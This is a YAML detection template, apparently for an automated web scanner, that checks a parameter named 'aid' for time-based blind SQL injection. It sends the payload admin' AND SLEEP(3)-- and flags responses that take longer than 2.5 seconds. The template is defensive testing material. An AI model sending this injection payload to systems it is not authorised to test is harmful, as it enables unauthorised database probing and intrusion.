id: sqli-time3-353
name: 'Delay probe in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - 'admin'' AND SLEEP(3)--'
    matchers:
      - type: time
        ms: 2500
